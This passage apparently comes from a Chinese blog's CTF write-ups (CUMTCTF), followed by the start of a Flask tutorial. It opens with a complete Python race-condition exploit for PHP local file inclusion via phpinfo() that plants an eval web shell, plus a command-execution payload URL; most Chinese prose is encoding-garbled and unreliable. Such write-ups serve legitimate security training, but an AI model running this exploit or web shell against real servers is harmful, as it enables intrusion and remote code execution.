<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span><span class="params">(host, port)</span>:</span></span><br><span class="line">    TAG=<span class="string">"Security Test"</span></span><br><span class="line">    PAYLOAD=<span class="string">"""%s\r</span></span><br><span class="line"><span class="string">&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\r"""</span> % TAG</span><br><span class="line">    REQ1_DATA=<span class="string">"""-----------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r</span></span><br><span class="line"><span class="string">Content-Type: text/plain\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">-----------------------------7dbff1ded0714--\r"""</span> % PAYLOAD</span><br><span class="line">    padding=<span class="string">"A"</span> * <span class="number">5000</span></span><br><span class="line">    REQ1=<span class="string">"""POST /phpinfo.php?a="""</span>+padding+<span class="string">""" HTTP/1.1\r</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT: """</span> + padding + <span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_USER_AGENT: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_ACCEPT_LANGUAGE: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">HTTP_PRAGMA: """</span>+padding+<span class="string">"""\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span></span><br><span class="line"><span class="string">Content-Length: %s\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">%s"""</span> %(len(REQ1_DATA),host,REQ1_DATA)</span><br><span class="line">    <span class="comment">#modify this to suit the LFI script   </span></span><br><span class="line">    LFIREQ=<span class="string">"""GET /index.php?file=%s HTTP/1.1\r</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/4.0\r</span></span><br><span class="line"><span class="string">Proxy-Connection: Keep-Alive\r</span></span><br><span class="line"><span class="string">Host: %s\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">return</span> (REQ1, TAG, LFIREQ)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">phpInfoLFI</span><span class="params">(host, port, phpinforeq, offset, lfireq, tag)</span>:</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> len(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>]</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br><span class="line"></span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadWorker</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, e, l, m, *args)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.event = e</span><br><span class="line">        self.lock =  l</span><br><span class="line">        self.maxattempts = m</span><br><span class="line">        self.args = args</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> counter</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.event.is_set():</span><br><span class="line">            <span class="keyword">with</span> self.lock:</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= self.maxattempts:</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                counter+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                x = phpInfoLFI(*self.args)</span><br><span class="line">                <span class="keyword">if</span> self.event.is_set():</span><br><span class="line">                    <span class="keyword">break</span>                </span><br><span class="line">                <span class="keyword">if</span> x:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"\nGot it! Shell created in /tmp/g"</span></span><br><span class="line">                    self.event.set()</span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOffset</span><span class="params">(host, port, phpinforeq)</span>:</span></span><br><span class="line">    <span class="string">"""Gets offset of tmp_name in the php output"""</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host,port))</span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    </span><br><span class="line">    d = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = s.recv(<span class="number">4096</span>)</span><br><span class="line">        d+=i        </span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">""</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># detect the final chunk</span></span><br><span class="line">        <span class="keyword">if</span> i.endswith(<span class="string">"0\r\n\r\n"</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    s.close()</span><br><span class="line">    i = d.find(<span class="string">"[tmp_name] =&amp;gt; "</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"No php tmp_name in phpinfo output"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"found %s at %i"</span> % (d[i:i+<span class="number">10</span>],i)</span><br><span class="line">    <span class="comment"># padded up a bit</span></span><br><span class="line">    <span class="keyword">return</span> i+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LFI With PHPInfo()"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"-="</span> * <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: %s host [port] [threads]"</span> % sys.argv[<span class="number">0</span>]</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        host = socket.gethostbyname(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span> socket.error, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with hostname %s: %s"</span> % (sys.argv[<span class="number">1</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    port=<span class="number">80</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        port = int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with port %d: %s"</span> % (sys.argv[<span class="number">2</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    poolsz=<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        poolsz = int(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> ValueError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error with poolsz %d: %s"</span> % (sys.argv[<span class="number">3</span>], e)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Getting initial offset..."</span>,  </span><br><span class="line">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class="line">    offset = getOffset(host, port, reqphp)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    maxattempts = <span class="number">1000</span></span><br><span class="line">    e = threading.Event()</span><br><span class="line">    l = threading.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Spawning worker pool (%d)..."</span> % poolsz</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">    tp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,poolsz):</span><br><span class="line">        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> e.wait(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> e.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">with</span> l:</span><br><span class="line">                sys.stdout.write( <span class="string">"\r% 4d / % 4d"</span> % (counter, maxattempts))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                <span class="keyword">if</span> counter &gt;= maxattempts:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span></span><br><span class="line">        <span class="keyword">if</span> e.is_set():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Woot!  \m/"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">":("</span></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;202.119.201.197:13077&#x2F;?file&#x3D;&#x2F;tmp&#x2F;g&amp;1&#x3D;system(%27cat%20&#x2F;tmp&#x2F;7IDUrqGOt8PMATm852&#x2F;flag.txt%27);</span><br><span class="line">#CUMTCTF&#123;Orz_to_php1nf0&#125;</span><br></pre></td></tr></table></figure>
<p>æœ€åç›´æ¥å‘½ä»¤æ‰§è¡Œï¼Œä½†å¥½åƒæ‰¾äº†å¥½ä¹…æ‰çœ‹è§flag</p>
<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="è¿ä¸ªç­¾åˆ°çš„åˆ†éƒ½ä¸ç»™ä½ "><a href="#è¿ä¸ªç­¾åˆ°çš„åˆ†éƒ½ä¸ç»™ä½ " class="headerlink" title="è¿ä¸ªç­¾åˆ°çš„åˆ†éƒ½ä¸ç»™ä½ "></a>è¿ä¸ªç­¾åˆ°çš„åˆ†éƒ½ä¸ç»™ä½ </h2><p>ç›´æ¥010æŸ¥çœ‹æœcumtctfå¯ä»¥çœ‹è§flag</p>
<h2 id="pythoné¢˜ç¦æ­¢py"><a href="#pythoné¢˜ç¦æ­¢py" class="headerlink" title="pythoné¢˜ç¦æ­¢py"></a>pythoné¢˜ç¦æ­¢py</h2><p>ç›´æ¥ä¸Šè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flag = input()</span></span><br><span class="line">cipher = [<span class="number">80</span>,<span class="number">70</span>,<span class="number">94</span>,<span class="number">71</span>,<span class="number">80</span>,<span class="number">71</span>,<span class="number">85</span>,<span class="number">104</span>,<span class="number">86</span>,<span class="number">39</span>,<span class="number">64</span>,<span class="number">106</span>,<span class="number">76</span>,<span class="number">67</span>,<span class="number">106</span>,<span class="number">71</span>,<span class="number">123</span>,<span class="number">92</span>,<span class="number">125</span>,<span class="number">76</span>,<span class="number">37</span>,<span class="number">106</span>,<span class="number">103</span>,<span class="number">118</span>,<span class="number">80</span>,<span class="number">35</span>,<span class="number">119</span>,<span class="number">32</span>,<span class="number">110</span>]</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># if(len(flag==29)):</span></span><br><span class="line"><span class="comment">#     for i,n in enumerate(flag):</span></span><br><span class="line"><span class="comment">#         if ord(n) ^ 19 != cipher[i]:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    a = i ^ <span class="number">19</span></span><br><span class="line">    print(chr(a),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
<h2 id="å…„å¼Ÿä»¬å¿«æ¥å¸®å¸®è„è„"><a href="#å…„å¼Ÿä»¬å¿«æ¥å¸®å¸®è„è„" class="headerlink" title="å…„å¼Ÿä»¬å¿«æ¥å¸®å¸®è„è„"></a>å…„å¼Ÿä»¬å¿«æ¥å¸®å¸®è„è„</h2><p>è„±å£³æ‹–å…¥IDAå¯ä»¥çœ‹è§flag</p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>nc ç›‘å¬é¢†flag</p>
<h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><p>è„±å…¥010å¹¶è¾“å…¥å­—ç¬¦ä¸²çœ‹æ˜¯ç›´æ¥å¯ä»¥bash</p>
<p>ç›´æ¥è¯»å–å°±å¯ä»¥æ‹¿flag</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="å¹¼å„¿å›­çš„å¯†ç é¢˜"><a href="#å¹¼å„¿å›­çš„å¯†ç é¢˜" class="headerlink" title="å¹¼å„¿å›­çš„å¯†ç é¢˜"></a>å¹¼å„¿å›­çš„å¯†ç é¢˜</h2><p>rsaï¼Œå·²çŸ¥e n c æ±‚m</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># e = 0x10001</span></span><br><span class="line"><span class="comment"># n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f</span></span><br><span class="line"><span class="comment"># c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hint ï¼š google RS</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c = <span class="number">0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d</span></span><br><span class="line">p = <span class="number">324350545929838254331191385863847627003</span></span><br><span class="line">q = <span class="number">328413456989577256301798468872388310877</span></span><br><span class="line">n = <span class="number">0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f</span></span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹è§flag</p>
<h2 id="å°å­¦ç”Ÿçš„å¯†ç é¢˜"><a href="#å°å­¦ç”Ÿçš„å¯†ç é¢˜" class="headerlink" title="å°å­¦ç”Ÿçš„å¯†ç é¢˜"></a>å°å­¦ç”Ÿçš„å¯†ç é¢˜</h2><p>è¿™ä¸ªå¾ˆæ˜æ˜¾å°±å¯ä»¥çœ‹å‡ºè§„å¾‹å°±æ˜¯ä¸€èˆ¬éƒ½æ˜¯ä»¥8å¼€å¤´</p>
<p>ç„¶åæˆ‘æœ‰ç‚¹æ‡’ï¼ˆè¯´å®è¯æ˜¯ä¸å¤ªä¼šå†™ï¼‰å°±ä¸€ä¸ªä¸€ä¸ªæ‹¼æ¥å‡ºflag</p>
<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="çœŸÂ·ç­¾åˆ°é¢˜"><a href="#çœŸÂ·ç­¾åˆ°é¢˜" class="headerlink" title="çœŸÂ·ç­¾åˆ°é¢˜"></a>çœŸÂ·ç­¾åˆ°é¢˜</h2><p>zipä¼ªåŠ å¯†ç„¶åbase64è§£å¯†æ‹¿flag</p>
<h2 id="åˆ«åšé¢˜äº†å¬æ­Œå§"><a href="#åˆ«åšé¢˜äº†å¬æ­Œå§" class="headerlink" title="åˆ«åšé¢˜äº†å¬æ­Œå§"></a>åˆ«åšé¢˜äº†å¬æ­Œå§</h2><p>mp3éšå†™</p>
<p>è¿™ä¸ªé¢˜å¯ä»¥  cumtæ˜¯å¯†ç </p>
<p>ç„¶åæ˜¯moseç¼–ç æˆ‘çœŸæ˜¯ä¸€ä¸ªä¸€ä¸ªæ‹¼çš„ï¼Œåº”è¯¥æ‹¿pythonè„šæœ¬å†™æ¯”è¾ƒå¥½ï¼Œæ¯•ç«Ÿpythoå­¦å¾—ä¸å¤ªå¥½</p>
<p>åº”è¯¥æ˜¯è¿™ä¸ªï¼Œæ‹¼é”™äº†å¥½å‡ å›</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CUMTCTF&#123;M0RS38MORSE8M0RS38MORSE8M0RSE8AND8MP3ST39O&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾"><a href="#å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾" class="headerlink" title="å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾"></a>å¤§é²¨é±¼ä¹‹ä½ å¯åŠ²æ‰¾</h2><p>æµé‡åŒ…åˆ†æï¼Œç›´æ¥è·Ÿtcpæµå¯ä»¥çœ‹è§ä¸€ä¸ªç›²æ³¨çš„ä¼ è¾“å†…å®¹</p>
<p>æ˜¯äºŒåˆ†æ³•</p>
<p>ç„¶åæˆ‘å°±åˆåˆåˆè‡ªå·±æ‹¼å†™</p>
<p>æ‹¼é”™äº†å¥½å‡ å›</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CUMTCTF&#123;cecc1394-6133-43d0-be06-a41c5f231dd4&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>é¢˜è§£</tag>
      </tags>
  </entry>
  <entry>
    <title>pythonå¼€å‘</title>
    <url>/2020/08/13/python%E5%BC%80%E5%8F%91/</url>
    <content><![CDATA[<a id="more"></a>
<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é¡ºä¾¿å¤ä¹ ä¸€ä¸‹pythonï¼Œä¸»è¦æ˜¯æŒæ¡ä¸€ä¸‹pythonçš„ä¸»æµæ¡†æ¶ï¼ˆFlaskå’ŒDjango ï¼‰</p>
<h1 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h1><h2 id="URLå’Œè§†å›¾"><a href="#URLå’Œè§†å›¾" class="headerlink" title="URLå’Œè§†å›¾"></a>URLå’Œè§†å›¾</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä»flaskè¿™ä¸ªæ¡†æ¶ä¸­å¯¼å…¥Flaskè¿™ä¸ªç±»</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–ä¸€ä¸ªFlaskå¯¹è±¡</span></span><br><span class="line"><span class="comment"># Flask()</span></span><br><span class="line"><span class="comment"># éœ€è¦ä¼ é€’ä¸€ä¸ªå‚æ•°__name__</span></span><br><span class="line"><span class="comment"># 1. æ–¹ä¾¿flaskæ¡†æ¶å»å¯»æ‰¾èµ„æº</span></span><br><span class="line"><span class="comment"># 2. æ–¹ä¾¿flaskæ’ä»¶æ¯”å¦‚Flask-Sqlalchemyå‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œå¥½å»å¯»æ‰¾é—®é¢˜æ‰€åœ¨çš„ä½ç½®</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @app.routeæ˜¯ä¸€ä¸ªè£…é¥°å™¨</span></span><br><span class="line"><span class="comment"># @å¼€å¤´ï¼Œå¹¶ä¸”åœ¨å‡½æ•°çš„ä¸Šé¢ï¼Œè¯´æ˜æ˜¯è£…é¥°å™¨</span></span><br><span class="line"><span class="comment"># è¿™ä¸ªè£…é¥°å™¨çš„ä½œç”¨ï¼Œæ˜¯åšä¸€ä¸ªurlä¸è§†å›¾å‡½æ•°çš„æ˜ å°„</span></span><br><span class="line"><span class="comment"># 127.0.0.1:5000/   -&gt;  å»è¯·æ±‚hello_worldè¿™ä¸ªå‡½æ•°ï¼Œç„¶åå°†ç»“æœè¿”å›ç»™æµè§ˆå™¨</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'æˆ‘æ˜¯ç¬¬ä¸€ä¸ªflaskç¨‹åº'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœå½“å‰è¿™ä¸ªæ–‡ä»¶æ˜¯ä½œä¸ºå…¥å£ç¨‹åºè¿è¡Œï¼Œé‚£ä¹ˆå°±æ‰§è¡Œapp.run()</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">        <span class="comment"># app.run()</span></span><br><span class="line">        <span class="comment"># å¯åŠ¨ä¸€ä¸ªåº”ç”¨æœåŠ¡å™¨ï¼Œæ¥æ¥å—ç”¨æˆ·çš„è¯·æ±‚</span></span><br><span class="line">        <span class="comment"># while True:</span></span><br><span class="line">        <span class="comment">#  listen()</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<h3 id="è®¾ç½®debugæ¨¡å¼"><a href="#è®¾ç½®debugæ¨¡å¼" class="headerlink" title="è®¾ç½®debugæ¨¡å¼"></a><strong>è®¾ç½®debugæ¨¡å¼</strong></h3><ol>
<li>åœ¨app.run()ä¸­ä¼ å…¥ä¸€ä¸ªå…³é”®å­—å‚æ•°debug,app.run(debug=True)ï¼Œå°±è®¾ç½®å½“å‰é¡¹ç›®ä¸ºdebugæ¨¡å¼ã€‚</li>
<li>debugæ¨¡å¼çš„ä¸¤å¤§åŠŸèƒ½ï¼š<ul>
<li>å½“ç¨‹åºå‡ºç°é—®é¢˜çš„æ—¶å€™ï¼Œå¯ä»¥åœ¨é¡µé¢ä¸­çœ‹åˆ°é”™è¯¯ä¿¡æ¯å’Œå‡ºé”™çš„ä½ç½®ã€‚</li>
<li>åªè¦ä¿®æ”¹äº†é¡¹ç›®ä¸­çš„<code>python</code>æ–‡ä»¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨åŠ è½½ï¼Œä¸éœ€è¦æ‰‹åŠ¨é‡æ–°å¯åŠ¨æœåŠ¡å™¨ã€‚</li>
</ul>
</li>
</ol>
<h3 id="ä½¿ç”¨é…ç½®æ–‡ä»¶"><a href="#ä½¿ç”¨é…ç½®æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨é…ç½®æ–‡ä»¶"></a><strong>ä½¿ç”¨é…ç½®æ–‡ä»¶</strong></h3><ol>
<li>æ–°å»ºä¸€ä¸ª<code>config.py</code>æ–‡ä»¶</li>
<li>åœ¨ä¸»appæ–‡ä»¶ä¸­å¯¼å…¥è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”é…ç½®åˆ°<code>app</code>ä¸­ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import config</span><br><span class="line">app.config.from_object(config)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="URLä¼ å‚åˆ°è§†å›¾"><a href="#URLä¼ å‚åˆ°è§†å›¾" class="headerlink" title="URLä¼ å‚åˆ°è§†å›¾"></a><strong>URLä¼ å‚åˆ°è§†å›¾</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;user&#x2F;&lt;id&gt;&#39;)</span><br><span class="line">def users(id):</span><br><span class="line">    return u&#39;æ‚¨è¯·æ±‚çš„å‚æ•°æ˜¯ï¼š&#123;&#125;&#39;.format(id)</span><br><span class="line">#å‚æ•°éœ€è¦æ”¾åœ¨ä¸¤ä¸ªå°–æ‹¬å·ä¸­ã€‚</span><br><span class="line">#è§†å›¾å‡½æ•°ä¸­éœ€è¦æ”¾å’Œurlä¸­çš„å‚æ•°åŒåçš„å‚æ•°ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="åè½¬URL"><a href="#åè½¬URL" class="headerlink" title="åè½¬URL"></a><strong>åè½¬URL</strong></h3><ol>
<li>ä»€ä¹ˆå«åšåè½¬URLï¼šä»è§†å›¾å‡½æ•°åˆ°urlçš„è½¬æ¢å«åšåè½¬url</li>
<li>åè½¬urlçš„ç”¨å¤„ï¼š<ul>
<li>åœ¨é¡µé¢é‡å®šå‘çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨urlåè½¬ã€‚</li>
<li>åœ¨æ¨¡æ¿ä¸­ï¼Œä¹Ÿä¼šä½¿ç”¨urlåè½¬ã€‚</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask,url_for</span><br><span class="line">print url_for(&#39;users&#39;,id&#x3D;&#39;1&#39;)</span><br></pre></td></tr></table></figure>
<p><strong>é¡µé¢è·³è½¬å’Œé‡å®šå‘</strong></p>
<p> ç”¨å¤„ï¼šåœ¨ç”¨æˆ·è®¿é—®ä¸€äº›éœ€è¦ç™»å½•çš„é¡µé¢çš„æ—¶å€™ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰ç™»å½•ï¼Œé‚£ä¹ˆå¯ä»¥è®©é‡å®šå‘åˆ°ç™»å½•é¡µé¢ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">form flask <span class="keyword">import</span> redirect,url_for</span><br><span class="line">url = url_for(<span class="string">'users'</span>)  usersæ˜¯è§†å›¾å‡½æ•°</span><br><span class="line">redirect(url)</span><br></pre></td></tr></table></figure>
<h2 id="jinja2æ¨¡æ¿"><a href="#jinja2æ¨¡æ¿" class="headerlink" title="jinja2æ¨¡æ¿"></a>jinja2æ¨¡æ¿</h2><h3 id="æ¨¡æ¿æ¸²æŸ“å’Œå‚æ•°"><a href="#æ¨¡æ¿æ¸²æŸ“å’Œå‚æ•°" class="headerlink" title="æ¨¡æ¿æ¸²æŸ“å’Œå‚æ•°"></a>æ¨¡æ¿æ¸²æŸ“å’Œå‚æ•°</h3><p>1.å¦‚ä½•æ¸²æŸ“æ¨¡æ¿ï¼š</p>
<ul>
<li>æ¨¡æ¿æ”¾åœ¨<code>templates</code>æ–‡ä»¶å¤¹ä¸‹</li>
<li>ä»<code>flask</code>ä¸­å¯¼å…¥<code>render_template</code>å‡½æ•°ã€‚</li>
<li>åœ¨è§†å›¾å‡½æ•°ä¸­ï¼Œä½¿ç”¨<code>render_template</code>å‡½æ•°ï¼Œæ¸²æŸ“æ¨¡æ¿ã€‚æ³¨æ„ï¼šåªéœ€è¦å¡«å†™æ¨¡æ¿çš„åå­—ï¼Œä¸éœ€è¦å¡«å†™<code>templates</code>è¿™ä¸ªæ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚</li>
</ul>
<p>2.æ¨¡æ¿ä¼ å‚ï¼š</p>
<ul>
<li>å¦‚æœåªæœ‰ä¸€ä¸ªæˆ–è€…å°‘é‡å‚æ•°ï¼Œç›´æ¥åœ¨<code>render_template</code>å‡½æ•°ä¸­æ·»åŠ å…³é”®å­—å‚æ•°å°±å¯ä»¥äº†ã€‚</li>
